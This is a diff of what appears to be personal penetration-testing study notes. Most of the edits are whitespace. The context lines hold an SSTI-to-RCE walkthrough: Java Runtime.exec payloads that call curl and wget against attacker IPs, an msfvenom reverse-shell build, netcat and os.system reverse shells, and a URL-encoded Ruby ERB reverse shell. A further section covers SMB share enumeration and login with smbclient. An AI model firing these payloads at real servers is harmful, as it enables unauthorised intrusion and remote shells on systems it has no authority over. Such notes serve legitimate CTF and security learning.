@@ -1,4 +1,5 @@
 ---
+
 #   Computer Science, Cybersecurity, and Software Engineering
 
  <script src="https://tryhackme.com/badge/1210884"></script>
@@ -210,23 +211,29 @@ a{{bar}}b
 ````
 
 1.  Start local server.
+
 ````
 python3 -m http.server 80
 
 ````
 2. Test functionality of python server remotely using JS and curl.
+
 ````
 *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.16.5")}
 
 10.10.16.5
+
 ````
 3. Create reverse shell payload and initialize a netcat listener for it. 
+
 ````
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.5.0.2 LPORT=5010 -f elf > r.elf
 
 nc -lvnp 443
+
 ````
 4. Perform the SSTI, getting RCE on the server.
+
 ````
 *{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.5.0.2:5003/r.elf")}
 
@@ -237,9 +244,13 @@ nc -lvnp 443
 *{os.system("nc -e /bin/sh 10.10.16.5 5010")}
 <%=system("ruby%20-rsocket%20-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.5.0.2%22%2C5007%29%29%27")%>
 ````
+
 Tools:
+
 ````
+
 - sstimap
+
 ````
 
 </details>
@@ -253,23 +264,31 @@ SMB uses port 445
 A common service name is 'microsoft-ds'
 After enumerating the system and finding a potential SMB exploitation pathway:
 Further enumerate the SMB service using smbclient:
+
 ````
+
 smbclient -L ip 
+
 ````
+
 * Share names will be listed
 
 	
 Check for the guest or anonymous login, ie:
 Sharenames:
+
 ````
 ADMIN$
 C$
 WorkShares
 ````
+
 After identifying potentially vulnerable share, attempt login:
+
 ````
 smbclient \\\\ip\\<share>>
 ````
+
 Upon entry --> 
 * browse directories, look for sensitive files
 * potential path traversal, pivot to other shares
@@ -367,3 +386,4 @@ Tools:
 - 0d1n
 ````
 </details>
+
